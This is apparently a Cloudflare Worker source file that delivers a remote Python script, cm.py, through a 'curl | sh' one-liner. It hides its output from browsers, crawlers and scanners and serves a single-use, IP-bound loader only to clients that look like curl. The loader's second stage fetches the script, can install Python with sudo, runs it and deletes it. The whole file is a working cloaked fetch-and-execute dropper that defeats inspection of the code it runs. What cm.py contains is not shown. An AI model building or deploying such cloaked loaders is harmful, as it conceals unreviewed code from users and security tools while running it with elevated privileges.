/**
 * Cloudflare Worker — zero-key, terminal-only, anti-scraper launcher for cm.py.
 *
 * Run:
 *   curl -fsSL https://executeee.nishkarshrana10.workers.dev | sh
 *
 * Behavior:
 *   - Browsers, link previews, bots, crawlers, scrapers, extra paths, query strings,
 *     expired tokens, wrong-IP tokens, and replayed tokens all receive ONLY: `err occured`
 *   - `GET /` (real `curl` only) returns a tiny 10-second, single-use, IP/UA/colo-bound
 *     HMAC + SHA-256 session loader containing zero installer code and zero upstream URLs.
 *   - `POST /` (valid one-time session only) fetches `cm.py` server-side (edge-cached),
 *     auto-installs Python 3 if missing, executes `cm.py` in a private 0700 temp directory
 *     with `/dev/tty` attached, and deletes the temp directory immediately on exit.
 */

const UPSTREAM_CM_URL =
  "https://raw.githubusercontent.com/Nishgamerrz/Nish12345678910111.github.io/main/cm.py";

const ERR_TEXT = "err occured\n";
const SESSION_TTL_MS = 10_000; // 10-second one-time session window
const MAX_SCRIPT_BYTES = 1024 * 1024; // 1 MiB safety cap
const RATE_WINDOW_MS = 60_000; // 1 minute
const RATE_MAX_REQUESTS = 8; // per IP per minute

const CURL_UA_RE = /^curl\/\d+\.\d+(?:\.\d+)?(?:-[A-Za-z0-9._-]+)?$/;

// Headers present on browsers, webviews, link previews, proxies, and headless scrapers.
const FORBIDDEN_HEADERS = Object.freeze([
  "sec-fetch-mode",
  "sec-fetch-site",
  "sec-fetch-dest",
  "sec-fetch-user",
  "sec-ch-ua",
  "sec-ch-ua-mobile",
  "sec-ch-ua-platform",
  "upgrade-insecure-requests",
  "accept-language",
  "referer",
  "origin",
  "cookie",
  "dnt",
  "sec-gpc",
  "x-requested-with",
  "purpose",
  "sec-purpose",
  "x-moz",
  "from",
]);

const RESPONSE_HEADERS = Object.freeze({
  "Content-Type": "text/plain; charset=utf-8",
  "Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "DENY",
  "X-Robots-Tag": "noindex, nofollow, noarchive, nosnippet",
  "Referrer-Policy": "no-referrer",
  "Cross-Origin-Resource-Policy": "same-origin",
  "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
  "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
});

const usedNonces = new Map(); // nonce -> expiresAt
const ipHits = new Map(); // ip -> { count, resetAt }
const encoder = new TextEncoder();

function errResponse(isHead = false) {
  return new Response(isHead ? null : ERR_TEXT, {
    status: 403,
    headers: RESPONSE_HEADERS,
  });
}

function okResponse(body) {
  return new Response(body, {
    status: 200,
    headers: RESPONSE_HEADERS,
  });
}

function pruneMaps(now) {
  if (usedNonces.size > 500) {
    for (const [nonce, exp] of usedNonces) {
      if (exp <= now) usedNonces.delete(nonce);
    }
  }
  if (ipHits.size > 1000) {
    for (const [ip, entry] of ipHits) {
      if (entry.resetAt <= now) ipHits.delete(ip);
    }
  }
}

function allowIp(ip, now) {
  pruneMaps(now);
  const entry = ipHits.get(ip);
  if (!entry || entry.resetAt <= now) {
    ipHits.set(ip, { count: 1, resetAt: now + RATE_WINDOW_MS });
    return true;
  }
  if (entry.count >= RATE_MAX_REQUESTS) {
    return false;
  }
  entry.count += 1;
  return true;
}

function isLocalHost(hostname) {
  return hostname === "localhost" || hostname === "127.0.0.1" || hostname === "[::1]";
}

function getClientIp(request) {
  return request.headers.get("CF-Connecting-IP") || "0.0.0.0";
}

function getClientFingerprint(request) {
  const ip = getClientIp(request);
  const ua = request.headers.get("User-Agent") || "";
  const colo = request.cf?.colo || "local";
  const tls = request.cf?.tlsVersion || "tls";
  return `${ip}|${ua}|${colo}|${tls}`;
}

function isGenuineCurl(request) {
  if (request.cf?.botManagement?.verifiedBot === true) {
    return false;
  }

  const ua = request.headers.get("User-Agent") || "";
  if (!CURL_UA_RE.test(ua)) {
    return false;
  }

  if ((request.headers.get("Accept") || "") !== "*/*") {
    return false;
  }

  for (const h of FORBIDDEN_HEADERS) {
    if (request.headers.has(h)) {
      return false;
    }
  }

  return true;
}

function toHex(bytes) {
  return Array.from(new Uint8Array(bytes), (b) => b.toString(16).padStart(2, "0")).join("");
}

function randomHex(byteLength = 16) {
  const buf = new Uint8Array(byteLength);
  crypto.getRandomValues(buf);
  return toHex(buf);
}

async function sha256Hex(input) {
  const data = typeof input === "string" ? encoder.encode(input) : input;
  return toHex(await crypto.subtle.digest("SHA-256", data));
}

async function timingSafeEqualStr(a, b) {
  const [ha, hb] = await Promise.all([
    crypto.subtle.digest("SHA-256", encoder.encode(String(a))),
    crypto.subtle.digest("SHA-256", encoder.encode(String(b))),
  ]);
  const va = new Uint8Array(ha);
  const vb = new Uint8Array(hb);
  let diff = 0;
  for (let i = 0; i < va.length; i++) {
    diff |= va[i] ^ vb[i];
  }
  return diff === 0;
}

async function hmacHex(secret, message) {
  const key = await crypto.subtle.importKey(
    "raw",
    encoder.encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  return toHex(await crypto.subtle.sign("HMAC", key, encoder.encode(message)));
}

async function deriveSigningKey(host, fingerprintHash) {
  return sha256Hex(`executeee-v3::${host}::${fingerprintHash}`);
}

async function createSession(request, host, now) {
  const exp = now + SESSION_TTL_MS;
  const nonce = randomHex(16);
  const challenge = randomHex(12);
  const fpHash = await sha256Hex(getClientFingerprint(request));
  const key = await deriveSigningKey(host, fpHash);
  const payload = `${exp}.${nonce}.${challenge}`;
  const sig = await hmacHex(key, `${payload}.${fpHash}`);
  return { token: `${payload}.${sig}`, challenge };
}

async function consumeSession(request, host, now) {
  const token = (request.headers.get("X-Session") || "").trim();
  const proof = (request.headers.get("X-Proof") || "").trim().toLowerCase();
  if (!token || !/^[a-f0-9]{64}$/.test(proof)) {
    return false;
  }

  const parts = token.split(".");
  if (parts.length !== 4) return false;
  const [expStr, nonce, challenge, sig] = parts;

  if (!/^\d{13,}$/.test(expStr)) return false;
  if (!/^[a-f0-9]{32}$/.test(nonce)) return false;
  if (!/^[a-f0-9]{24}$/.test(challenge)) return false;
  if (!/^[a-f0-9]{64}$/.test(sig)) return false;

  const exp = Number(expStr);
  if (!Number.isSafeInteger(exp) || now > exp || exp - now > SESSION_TTL_MS + 3_000) {
    return false;
  }

  if (usedNonces.has(nonce)) {
    return false;
  }

  const fpHash = await sha256Hex(getClientFingerprint(request));
  const key = await deriveSigningKey(host, fpHash);
  const expectedSig = await hmacHex(key, `${expStr}.${nonce}.${challenge}.${fpHash}`);
  if (!(await timingSafeEqualStr(sig, expectedSig))) {
    return false;
  }

  const expectedProof = await sha256Hex(`${token}:${challenge}`);
  if (!(await timingSafeEqualStr(proof, expectedProof))) {
    return false;
  }

  usedNonces.set(nonce, exp + 5_000);
  return true;
}

/**
 * Minimal Stage-1 handshake loader: contains zero application code and zero upstream URLs.
 * Token is bound to IP + curl UA + Cloudflare colo + TLS version and expires in 10 seconds.
 */
function buildSessionLoader(origin, token, challenge, requireTty) {
  const ttyLine = requireTty
    ? `( : </dev/tty ) 2>/dev/null || { printf 'err occured\\n' >&2; exit 1; }`
    : `:`;
  const execLine = requireTty
    ? `exec sh -c "$S" </dev/tty`
    : `if ( : </dev/tty ) 2>/dev/null; then exec sh -c "$S" </dev/tty; else exec sh -c "$S"; fi`;

  return `#!/bin/sh
set -eu
${ttyLine}
_h() {
  if command -v sha256sum >/dev/null 2>&1; then printf '%s' "$1" | sha256sum | cut -d' ' -f1
  elif command -v shasum >/dev/null 2>&1; then printf '%s' "$1" | shasum -a 256 | cut -d' ' -f1
  elif command -v openssl >/dev/null 2>&1; then printf '%s' "$1" | openssl dgst -sha256 -r | cut -d' ' -f1
  else return 1; fi
}
T='${token}'
P="$(_h "$T:${challenge}")" || { printf 'err occured\\n' >&2; exit 1; }
S="$(curl -fsSL -X POST --data '' -H "X-Session: $T" -H "X-Proof: $P" '${origin}/' 2>/dev/null)" || { printf 'err occured\\n' >&2; exit 1; }
[ -n "$S" ] || { printf 'err occured\\n' >&2; exit 1; }
${execLine}
`;
}

/**
 * Stage-2 runner (served ONLY after a verified single-use 10s terminal handshake):
 * Auto-installs Python 3 if missing, writes cm.py into a private 0700 temp folder,
 * runs it with the terminal attached, and removes the temp folder on exit.
 */
function buildStage2Runner(cmPyContent) {
  const normalized = cmPyContent.endsWith("\n") ? cmPyContent : `${cmPyContent}\n`;
  let eofTag = "__CM_PAYLOAD_EOF__";
  while (normalized.includes(eofTag)) {
    eofTag = `__CM_PAYLOAD_${randomHex(4)}__`;
  }

  return `#!/bin/sh
set -eu

HAS_TTY=0
if ( : </dev/tty ) 2>/dev/null; then
  HAS_TTY=1
fi

run_priv() {
  if [ "$(id -u 2>/dev/null || echo 1)" -eq 0 ]; then
    "$@"
  elif command -v sudo >/dev/null 2>&1; then
    if [ "$HAS_TTY" -eq 1 ]; then sudo "$@" </dev/tty; else sudo -n "$@"; fi
  elif command -v doas >/dev/null 2>&1; then
    if [ "$HAS_TTY" -eq 1 ]; then doas "$@" </dev/tty; else doas -n "$@"; fi
  else
    echo "Error: root/sudo privileges are required to install Python 3." >&2
    return 1
  fi
}

is_termux() {
  case "\${PREFIX:-}" in *com.termux*) return 0 ;; esac
  [ -d "/data/data/com.termux/files/usr" ]
}

find_python3() {
  for candidate in python3 python; do
    if command -v "$candidate" >/dev/null 2>&1; then
      if "$candidate" -c "import sys,ssl,urllib.request; sys.exit(0 if sys.version_info[0] >= 3 else 1)" >/dev/null 2>&1; then
        PY="$candidate"
        return 0
      fi
    fi
  done
  return 1
}

install_python3() {
  echo "Python 3 not found — installing Python 3 automatically..."
  if is_termux && command -v pkg >/dev/null 2>&1; then
    DEBIAN_FRONTEND=noninteractive pkg update -y </dev/null
    DEBIAN_FRONTEND=noninteractive pkg install -y python </dev/null
  elif command -v apt-get >/dev/null 2>&1; then
    run_priv env DEBIAN_FRONTEND=noninteractive apt-get update -y
    run_priv env DEBIAN_FRONTEND=noninteractive apt-get install -y python3 ca-certificates
  elif command -v apk >/dev/null 2>&1; then
    run_priv apk add --no-cache python3 ca-certificates
  elif command -v dnf >/dev/null 2>&1; then
    run_priv dnf install -y python3 ca-certificates
  elif command -v yum >/dev/null 2>&1; then
    run_priv yum install -y python3 ca-certificates
  elif command -v pacman >/dev/null 2>&1; then
    if [ -n "\${MSYSTEM:-}" ]; then
      pacman -Sy --noconfirm python ca-certificates
    else
      run_priv pacman -Sy --noconfirm python ca-certificates
    fi
  elif command -v zypper >/dev/null 2>&1; then
    run_priv zypper --non-interactive install python3 ca-certificates
  elif command -v brew >/dev/null 2>&1; then
    NONINTERACTIVE=1 brew install python3
    for d in /opt/homebrew/bin /usr/local/bin; do
      [ -d "$d" ] && PATH="$d:$PATH"
    done
    export PATH
  elif command -v winget.exe >/dev/null 2>&1; then
    winget.exe install -e --id Python.Python.3.12 --scope user --accept-source-agreements --accept-package-agreements
    if [ -n "\${LOCALAPPDATA:-}" ]; then
      for d in "$LOCALAPPDATA"/Programs/Python/Python3*; do
        [ -d "$d" ] && PATH="$d:$PATH"
      done
      export PATH
    fi
  else
    echo "Error: could not install Python 3 automatically. Please install python3 and retry." >&2
    exit 1
  fi
}

PY=""
if ! find_python3; then
  install_python3
  hash -r 2>/dev/null || true
  if ! find_python3; then
    echo "Error: Python 3 installed, but python3 was not found in PATH." >&2
    exit 1
  fi
fi

umask 077
TMP_BASE="\${TMPDIR:-}"
if [ -z "$TMP_BASE" ] || [ ! -d "$TMP_BASE" ]; then
  if [ -n "\${PREFIX:-}" ] && [ -d "$PREFIX/tmp" ]; then
    TMP_BASE="$PREFIX/tmp"
  else
    TMP_BASE="/tmp"
  fi
fi
WORK_DIR="$(mktemp -d "$TMP_BASE/cm.XXXXXXXXXX")"
trap 'rm -rf "$WORK_DIR"' EXIT INT TERM HUP
TARGET="$WORK_DIR/cm.py"

cat > "$TARGET" <<'${eofTag}'
${normalized}${eofTag}

if [ "$HAS_TTY" -eq 1 ]; then
  "$PY" "$TARGET" </dev/tty
else
  "$PY" "$TARGET"
fi
`;
}

async function fetchCmPy() {
  let upstream;
  try {
    upstream = await fetch(UPSTREAM_CM_URL, {
      cf: { cacheTtl: 60, cacheEverything: true },
      headers: { "User-Agent": "Executeee-Worker/3.0" },
    });
  } catch {
    return null;
  }

  if (!upstream.ok) return null;

  const declaredLen = Number(upstream.headers.get("content-length") || "0");
  if (declaredLen > MAX_SCRIPT_BYTES) return null;

  const buffer = await upstream.arrayBuffer();
  if (buffer.byteLength === 0 || buffer.byteLength > MAX_SCRIPT_BYTES) {
    return null;
  }

  return new TextDecoder("utf-8", { fatal: false }).decode(buffer);
}

export default {
  async fetch(request, env = {}) {
    const isHead = request.method === "HEAD";

    if (request.method !== "GET" && request.method !== "POST") {
      return errResponse(isHead);
    }

    const url = new URL(request.url);
    if (url.protocol === "http:" && !isLocalHost(url.hostname)) {
      return errResponse(false);
    }

    if (url.pathname !== "/" || url.search !== "") {
      return errResponse(false);
    }

    const now = Date.now();
    if (!allowIp(getClientIp(request), now)) {
      return errResponse(false);
    }

    if (!isGenuineCurl(request)) {
      return errResponse(false);
    }

    if (request.method === "GET") {
      const { token, challenge } = await createSession(request, url.host, now);
      const requireTty = String(env?.ALLOW_NON_TTY || "") !== "1";
      return okResponse(buildSessionLoader(url.origin, token, challenge, requireTty));
    }

    // POST: verify 10s single-use IP/UA/colo/TLS-bound session + SHA-256 proof.
    if (!(await consumeSession(request, url.host, now))) {
      return errResponse(false);
    }

    const cmPy = await fetchCmPy();
    if (!cmPy) {
      return errResponse(false);
    }

    return okResponse(buildStage2Runner(cmPy));
  },
};

export const _internal = {
  resetState: () => {
    usedNonces.clear();
    ipHits.clear();
  },
};
